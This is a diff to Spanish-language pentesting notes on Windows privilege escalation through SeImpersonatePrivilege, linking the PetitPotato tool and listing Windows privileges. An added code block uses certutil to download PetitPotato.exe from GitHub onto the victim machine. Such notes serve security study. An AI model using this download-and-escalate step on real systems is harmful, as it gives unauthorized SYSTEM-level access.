@@ -4,6 +4,8 @@ Tags: #AD #Windows #SeImpersonatePrivilege #SeAssignPrimaryTokenPrivilege
 
 * [Escalacion-Privilegios-Payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
+## SeImpersonatePrivilege
+
 Abusando de los privilegios **SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege**. Esto funciona con un usuario que tiene bajo nivel en una maquina Windows. Si este usuario tiene los privilegios antes mencionados se puede aprovechar para obtener acceso a nivel de SYSTEM.
 
 * [PetitPotato](https://github.com/wh0amitz/PetitPotato)
@@ -16,7 +18,9 @@ Abusando de los privilegios **SeImpersonatePrivilege, SeAssignPrimaryTokenPrivil
 ```bash 
 # Descargar el archivo directamente desde la url y se coloca en una ruta especifica en la maquina victima 
 
-❯ certutil -urlcache -f https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe C:\Users\Public\PetitPotato.exe              
+❯ certutil -urlcache -f https://github.com/wh0amitz/PetitPotato/releases/download/v1.0.0/PetitPotato.exe C:\Users\Public\PetitPotato.exe  
+
+❯ dir C:\Users\Public\PetitPotato.exe     # Verificar si se descargo el archivo 
 ```
 
 ```bash 
@@ -85,7 +89,7 @@ En los sistemas operativos Windows, los privilegios son permisos otorgados a las
 9. SeCreateTokenPrivilege: Crear un token de objeto.
 10. SeDebugPrivilege: Depurar programas.
 11. SeEnableDelegationPrivilege: Habilitar la delegación de seguridad.
-12. [SeImpersonatePrivilege: Impersonar a un cliente después de la autenticación.
+12. SeImpersonatePrivilege: Impersonar a un cliente después de la autenticación.
 13. SeIncreaseBasePriorityPrivilege: Aumentar la prioridad de proceso.
 14. SeIncreaseQuotaPrivilege: Aumentar cuotas de proceso.
 15. SeIncreaseWorkingSetPrivilege: Aumentar el conjunto de trabajo de un proceso.
